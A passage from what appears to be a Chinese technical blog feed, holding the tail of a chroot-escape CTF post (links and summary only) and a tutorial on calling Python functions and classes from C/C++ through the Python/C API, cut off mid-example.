target="_blank" rel="noopener">linux中的容器与沙箱初探 — Atum</a></p><p><a href="http://maskray.me/blog/2011-08-16-break-out-of-chroot" target="_blank" rel="noopener">脱离chroot的枷锁 | MaskRay</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;最近网鼎杯青龙组做到了一道chroot逃逸的题目，正好整理一下它逃逸的原理。&lt;/p&gt;
    
    </summary>
    
    
      <category term="chroot" scheme="wood1314.github.io/tags/chroot/"/>
    
      <category term="逃逸" scheme="wood1314.github.io/tags/%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>在C/C++中调用python代码</title>
    <link href="wood1314.github.io/year/08/04/clgvp3n6x005l6n3f3e73mwmx/"/>
    <id>wood1314.github.io/year/08/04/clgvp3n6x005l6n3f3e73mwmx/</id>
    <published>2022-08-04T02:22:29.000Z</published>
    <updated>2022-08-04T10:23:44.029Z</updated>
    
    <content type="html"><![CDATA[<p>最近使用C++实现了一个fuzz。但是发现对应目标有认证流程，我的fuzz代码上也得加上这个加密认证逻辑才能正常工作。经过谷哥的帮助，在网上找到了一段python实现的加密认证逻辑。</p><p>让我自己用C++重写？那是不可能的，于是就走上了用C++调用python的踩坑之路。</p><a id="more"></a><h2 id="0x01-执行简单Python代码"><a href="#0x01-执行简单Python代码" class="headerlink" title="0x01 执行简单Python代码"></a>0x01 执行简单Python代码</h2><p>如果我们应用的场景并不复杂，比如知识想执行一段简单的python代码。那么你只需要了解以下内容</p><ol><li>在头文件中包含Python.h头文件</li><li>使用<code>Py_Initialize()</code> 初始化python解析器</li><li>使用<code>PyRun_SimpleString</code>执行python代码</li><li><code>Py_Finalize</code> 释放python解析器</li></ol><p>以下就是一个实现的demo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Python.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Py_Initialize();    ##初始化  </span><br><span class="line">    PyRun_SimpleString(<span class="string">"print('hello')"</span>);</span><br><span class="line">    Py_Finalize();      ##释放资源    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意在链接的时候加上对应的库，编译指令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ test.cpp -I/usr/include/python3.8 -l python3.8</span><br></pre></td></tr></table></figure><h2 id="0x02-执行简单python脚本中的函数"><a href="#0x02-执行简单python脚本中的函数" class="headerlink" title="0x02 执行简单python脚本中的函数"></a>0x02 执行简单python脚本中的函数</h2><h3 id="2-1-无参数与返回值"><a href="#2-1-无参数与返回值" class="headerlink" title="2.1 无参数与返回值"></a>2.1 无参数与返回值</h3><p>有的时候我们需要调用python脚本中的函数来实现一些功能，假设这个时候我们有这样一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cat script/sayHello.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">()</span>:</span></span><br><span class="line">print(<span class="string">"hello"</span>)</span><br></pre></td></tr></table></figure><p>然后我们需要了解一些常用api</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导入函数相关</span></span><br><span class="line"><span class="function">PyObject* <span class="title">PyModule_GetDict</span><span class="params">( PyObject *<span class="keyword">module</span>)</span></span></span><br><span class="line"><span class="function">    <span class="comment">/*</span></span></span><br><span class="line"><span class="function"><span class="comment">    PyModule_GetDict()函数可以获得Python模块中的函数列表。PyModule_GetDict()函数返回一个字典。字典中的关键字为函数名，值为函数的调用地址。</span></span></span><br><span class="line"><span class="function"><span class="comment">字典里面的值可以通过PyDict_GetItemString()函数来获取，其中p是PyModule_GetDict()的字典，而key则是对应的函数名</span></span></span><br><span class="line"><span class="function"><span class="comment">*/</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">PyObject* <span class="title">PyObject_GetAttrString</span><span class="params">(PyObject *o, <span class="keyword">char</span> *attr_name)</span></span></span><br><span class="line"><span class="function">  <span class="comment">/*</span></span></span><br><span class="line"><span class="function"><span class="comment">     PyObject_GetAttrString()返回模块对象中的attr_name属性或函数，相当于Python中表达式语句：o.attr_name</span></span></span><br><span class="line"><span class="function"><span class="comment">     */</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//调用函数相关</span></span></span><br><span class="line"><span class="function">PyObject* <span class="title">PyObject_CallObject</span><span class="params">( PyObject *callable_object, PyObject *args)</span></span></span><br><span class="line"><span class="function">PyObject* <span class="title">PyObject_CallFunction</span><span class="params">( PyObject *callable_object, <span class="keyword">char</span> *format, ...)</span></span></span><br><span class="line"><span class="function">  <span class="comment">/*</span></span></span><br><span class="line"><span class="function"><span class="comment">    使用上面两个函数可以在C程序中调用Python中的函数。callable_object为要调用的函数对象，也就是通过上述导入函数得到的函数对象，</span></span></span><br><span class="line"><span class="function"><span class="comment">而区别在于前者使用python的tuple来传参，后者则使用类似c语言printf的风格进行传参。</span></span></span><br><span class="line"><span class="function"><span class="comment">如果不需要参数，那么args可能为NULL。返回成功时调用的结果，或失败时返回NULL。</span></span></span><br><span class="line"><span class="function"><span class="comment">这相当于Python表达式 apply(callable_object, args) 或 callable_object(*args)</span></span></span><br><span class="line"><span class="function"><span class="comment">*/</span></span></span><br></pre></td></tr></table></figure><p>我们可以像下面这样去加载调用模块，并调用指定的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;python2.7/Python.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Py_Initialize();</span><br><span class="line"><span class="keyword">if</span>( !Py_IsInitialized())&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"python init fail"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">PyRun_SimpleString(<span class="string">"import sys"</span>);</span><br><span class="line">PyRun_SimpleString(<span class="string">"sys.path.append('./script')"</span>);</span><br><span class="line"></span><br><span class="line">PyObject* pModule = PyImport_ImportModule(<span class="string">"sayHello"</span>);</span><br><span class="line"><span class="keyword">if</span>( pModule == <span class="literal">NULL</span> )&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;<span class="string">"module not found"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PyObject* pFunc = PyObject_GetAttrString(pModule, <span class="string">"say"</span>);</span><br><span class="line"><span class="keyword">if</span>( !pFunc || !PyCallable_Check(pFunc))&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;<span class="string">"not found function add_num"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> PyObject_CallObject(pFunc, <span class="literal">NULL</span> );</span><br><span class="line"></span><br><span class="line">Py_Finalize();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2有参数与返回值"><a href="#2-2有参数与返回值" class="headerlink" title="2.2有参数与返回值"></a>2.2有参数与返回值</h3><h4 id="参数构建"><a href="#参数构建" class="headerlink" title="参数构建"></a>参数构建</h4><p>在Python/C API中提供了Py_BuildValue()函数对数字和字符串进行转换处理，使之变成Python中相应的数据类型。其函数原型如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PyObject* <span class="title">Py_BuildValue</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span></span><br><span class="line"><span class="function">  <span class="comment">/*</span></span></span><br><span class="line"><span class="function"><span class="comment">    Py_BuildValue()提供了类似c语言printf的参数构造方法，format是要构造的参数的类型列表，函数中剩余的参数即要转换的C语言中的整型、浮点型或者字符串等。</span></span></span><br><span class="line"><span class="function"><span class="comment">其返回值为PyObject型的指针。</span></span></span><br><span class="line"><span class="function"><span class="comment">*/</span></span></span><br></pre></td></tr></table></figure><p>format对应的类型列表如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">s(str或None)[<span class="keyword">char</span> *]</span><br><span class="line">使用'utf-8'编码将以null结尾的C字符串转换为Python str对象。如果C字符串指针为NULL，则表示None。</span><br><span class="line"></span><br><span class="line">s＃(str或None)[<span class="keyword">char</span> *，<span class="keyword">int</span>]</span><br><span class="line">使用'utf-8'编码将C字符串及其长度转换为Python str对象。如果C字符串指针为NULL，则忽略长度返回None。</span><br><span class="line"></span><br><span class="line">y(字节)[<span class="keyword">char</span> *]</span><br><span class="line">这会将C字符串转换为Python字节对象。如果C字符串指针为<span class="literal">NULL</span>，则返回None。</span><br><span class="line"></span><br><span class="line">y＃(字节)[<span class="keyword">char</span> *，<span class="keyword">int</span>]</span><br><span class="line">这会将C字符串及其长度转换为Python对象。如果C字符串指针为<span class="literal">NULL</span>，则返回None。</span><br><span class="line"></span><br><span class="line">z(str或None)[<span class="keyword">char</span> *]</span><br><span class="line">与s相同。</span><br><span class="line"></span><br><span class="line">z＃(str或None)[<span class="keyword">char</span> *，<span class="keyword">int</span>]</span><br><span class="line">与s＃相同。</span><br><span class="line"></span><br><span class="line">u(str)[Py_UNICODE *]</span><br><span class="line">将Unicode(UCS<span class="number">-2</span>或UCS<span class="number">-4</span>)数据的以null结尾的缓冲区转换为Python Unicode对象。如果Unicode缓冲区指针为<span class="literal">NULL</span>，则返回None。</span><br><span class="line"></span><br><span class="line">u＃(str)[Py_UNICODE *，<span class="keyword">int</span>]</span><br><span class="line">将Unicode(UCS<span class="number">-2</span>或UCS<span class="number">-4</span>)数据缓冲区及其长度转换为Python Unicode对象。如果Unicode缓冲区指针为<span class="literal">NULL</span>，则忽略长度并返回None。</span><br><span class="line"></span><br><span class="line">U(str或None)[<span class="keyword">char</span> *]</span><br><span class="line">与s相同。</span><br><span class="line"></span><br><span class="line">U＃(str或None)[<span class="keyword">char</span> *，<span class="keyword">int</span>]</span><br><span class="line">与s＃相同。</span><br><span class="line"></span><br><span class="line">i(<span class="keyword">int</span>)[<span class="keyword">int</span>]</span><br><span class="line">将普通的C <span class="keyword">int</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">b(<span class="keyword">int</span>)[<span class="keyword">char</span>]</span><br><span class="line">将纯C <span class="keyword">char</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">h(<span class="keyword">int</span>)[short <span class="keyword">int</span>]</span><br><span class="line">将普通的C short <span class="keyword">int</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">l(<span class="keyword">int</span>)[<span class="keyword">long</span> <span class="keyword">int</span>]</span><br><span class="line">将C <span class="keyword">long</span> <span class="keyword">int</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">B(<span class="keyword">int</span>)[<span class="keyword">unsigned</span> <span class="keyword">char</span>]</span><br><span class="line">将C <span class="keyword">unsigned</span> <span class="keyword">char</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">H(<span class="keyword">int</span>)[<span class="keyword">unsigned</span> short <span class="keyword">int</span>]</span><br><span class="line">将C <span class="keyword">unsigned</span> short <span class="keyword">int</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">I(<span class="keyword">int</span>)[<span class="keyword">unsigned</span> <span class="keyword">int</span>]</span><br><span class="line">将C <span class="keyword">unsigned</span> <span class="keyword">int</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">k(<span class="keyword">int</span>)[<span class="keyword">unsigned</span> <span class="keyword">long</span>]</span><br><span class="line">将C <span class="keyword">unsigned</span> <span class="keyword">long</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">L(<span class="keyword">int</span>)[<span class="keyword">long</span> <span class="keyword">long</span>]</span><br><span class="line">将C <span class="keyword">long</span> <span class="keyword">long</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">K(<span class="keyword">int</span>)[<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>]</span><br><span class="line">将C <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">n(<span class="keyword">int</span>)[Py_ssize_t]</span><br><span class="line">将C Py_ssize_t转换为Python整数。</span><br><span class="line"></span><br><span class="line">c(长度为<span class="number">1</span>的字节)[<span class="keyword">char</span>]</span><br><span class="line">将表示字节的C <span class="keyword">int</span>转换为长度为<span class="number">1</span>的Python字节对象。</span><br><span class="line"></span><br><span class="line">C(长度为<span class="number">1</span>的str)[<span class="keyword">int</span>]</span><br><span class="line">将表示字符的C <span class="keyword">int</span>转换为长度为<span class="number">1</span>的Python str对象。</span><br><span class="line"></span><br><span class="line">d(<span class="keyword">float</span>) [<span class="keyword">double</span>] </span><br><span class="line">将C <span class="keyword">double</span>转换为Python浮点数。</span><br><span class="line"></span><br><span class="line">f(<span class="keyword">float</span>) [<span class="keyword">float</span>] </span><br><span class="line">将C <span class="keyword">float</span>转换为Python浮点数。</span><br><span class="line"></span><br><span class="line">D(<span class="built_in">complex</span>) [Py_complex *]</span><br><span class="line">将C Py_complex结构转换为Python复数。</span><br><span class="line"></span><br><span class="line">O(object) [PyObject *]</span><br><span class="line">不改变Python对象的传递(引用计数除外，它增加<span class="number">1</span>)。如果传入的对象是<span class="literal">NULL</span>指针，则假定这是因为产生参数的调用发现错误并设置了异常。</span><br><span class="line">因此，Py_BuildValue()将返回<span class="literal">NULL</span>但不会引发异常。如果尚未引发异常，则设置SystemError。</span><br><span class="line"></span><br><span class="line">S(object) [PyObject *]</span><br><span class="line">与O相同</span><br><span class="line"></span><br><span class="line">N((object) [PyObject *]</span><br><span class="line">与O相同，但不会增加对象的引用计数。通过调用参数列表中的对象构造函数创建对象时很有用。</span><br><span class="line"></span><br><span class="line">O＆(object) [converter, anything] </span><br><span class="line">通过转换器函数将任何内容转换为Python对象。该函数被调用任何东西(应与<span class="keyword">void</span> *兼容)作为其参数，并应返回“新”Python对象，如果发生错误则返回<span class="literal">NULL</span>。</span><br><span class="line"></span><br><span class="line">(items) (tuple) [matching-items] </span><br><span class="line">将一系列C值转换为具有相同项目数的Python元组。</span><br><span class="line"></span><br><span class="line">[items](<span class="built_in">list</span>) [matching-items]</span><br><span class="line">将一系列C值转换为具有相同项目数的Python列表。</span><br><span class="line"></span><br><span class="line">&#123;items&#125;(dict) [matching-items] </span><br><span class="line">将一系列C值转换为Python字典。每对连续的C值将一个项添加到字典中，分别用作键和值。</span><br><span class="line">如果格式字符串中存在错误，则设置SystemError异常并返回<span class="literal">NULL</span>。</span><br></pre></td></tr></table></figure><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>python函数的返回值也是PyObject类型，因此，在python脚本返回到C/C++之后，需要解构Python数据为C的类型，这样C/C++程序中才可以使用Python里的数据。但是，由于python的返回值有多种数据结构类型，因此，我们需要为每个类型进行转换。不过由于篇幅问题，我们只是介绍简单的整形和字符串类型的处理，其他类型的返回见文末的github链接，总体思路都是根据类型逐个从值从PyObject中提取。python提供了下面函数来完成这个功能</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">PyArg_Parse</span><span class="params">( PyObject *args, <span class="keyword">char</span> *format, ...)</span></span></span><br><span class="line">     根据format把args的值转换成c类型的值，format接受的类型和上述Py_BuildValue()的是一样的</span><br></pre></td></tr></table></figure><h4 id="释放资源"><a href="#释放资源" class="headerlink" title="释放资源"></a>释放资源</h4><p>Python使用引用计数机制对内存进行管理，实现自动垃圾回收。在C/C++中使用Python对象时，应正确地处理引用计数，否则容易导致内存泄漏。在Python/C API中提供了Py_CLEAR()、Py_DECREF()等宏来对引用计数进行操作。<br>当使用Python/C API中的函数创建列表、元组、字典等后，就在内存中生成了这些对象的引用计数。在对其完成操作后应该使用Py_CLEAR()、Py_DECREF()等宏来销毁这些对象。其原型分别如下所示</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Py_CLEAR</span><span class="params">(PyObject *o)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Py_DECREF</span><span class="params">(PyObject *o)</span></span></span><br><span class="line">其中，o的含义是要进行操作的对象。</span><br><span class="line">对于Py_CLEAR()其参数可以为<span class="literal">NULL</span>指针，此时，Py_CLEAR()不进行任何操作。而对于Py_DECREF()其参数不能为<span class="literal">NULL</span>指针，否则将导致错误。</span><br></pre></td></tr></table></figure><p>下面是个简单的例子，在例子中会有输出和返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">cat script/Py2Cpp.py</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">def add_num(a,b):</span></span><br><span class="line"><span class="comment">return a+b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;python2.7/Python.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Py_Initialize();</span><br><span class="line"><span class="keyword">if</span>( !Py_IsInitialized())&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"python init fail"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">PyRun_SimpleString(<span class="string">"import sys"</span>);</span><br><span class="line">PyRun_SimpleString(<span class="string">"sys.path.append('./script')"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PyObject* moduleName = PyString_FromString(<span class="string">"Py2Cpp"</span>);</span><br><span class="line">PyObject* pModule = PyImport_Import(moduleName);</span><br><span class="line"><span class="keyword">if</span>( pModule == <span class="literal">NULL</span> )&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;<span class="string">"module not found"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PyObject* pFunc = PyObject_GetAttrString(pModule, <span class="string">"add_num"</span>);</span><br><span class="line"><span class="keyword">if</span>( !pFunc || !PyCallable_Check(pFunc))&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;<span class="string">"not found function add_num"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PyObject* args = Py_BuildValue(<span class="string">"(ii)"</span>, <span class="number">28</span>, <span class="number">103</span>);</span><br><span class="line">PyObject* pRet = PyObject_CallObject(pFunc, args );</span><br><span class="line">        Py_DECREF(args);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">PyArg_Parse(pRet, <span class="string">"i"</span>, &amp;res );</span><br><span class="line">        Py_DECREF(pRet);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; res &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">Py_Finalize();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-调用类中的函数"><a href="#2-3-调用类中的函数" class="headerlink" title="2.3 调用类中的函数"></a>2.3 调用类中的函数</h3><p>大概流程是：</p><p>第一步，导入python文件，如前文所述</p><p>第二步，导入已经导入的模块的方法或类</p><p>第三步，使用导入的方法或类</p><p>第四步，释放资源</p><p>下面结合具体例子来分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Py_Initialize();</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span> (!Py_IsInitialized())&#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"Inital failed \n"</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   PyGC_Collect();</span><br><span class="line">   PyRun_SimpleString(<span class="string">"import sys"</span>);</span><br><span class="line">   PyRun_SimpleString(<span class="string">"sys.path.append('../src/decrpt_func/')"</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//import testpy.py</span></span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"Called"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">   PyObject *pModule = PyImport_ImportModule(<span class="string">"testpy"</span>);</span><br><span class="line">   <span class="keyword">if</span>(!pModule) &#123;</span><br><span class="line">       <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">" Moudle load worong"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//使用PyObject* pDict来存储导入模块中的方法字典, 调用的方法是PyModule_GetDict(module):  PyObject* pDict = PyModule_GetDict(pModule); </span></span><br><span class="line">   PyObject *pDict = PyModule_GetDict(pModule);</span><br><span class="line">   <span class="keyword">if</span> (!pDict) &#123;</span><br><span class="line">       <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">" Dict worong"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//使用PyDict_GetItemString可以获得该模块中的方法或类，此处导入了Person类</span></span><br><span class="line">   PyObject *pClass = PyDict_GetItemString(pDict, <span class="string">"Person"</span>);</span><br><span class="line">   <span class="keyword">if</span>(!pClass) &#123;</span><br><span class="line">       <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">" class worong"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span 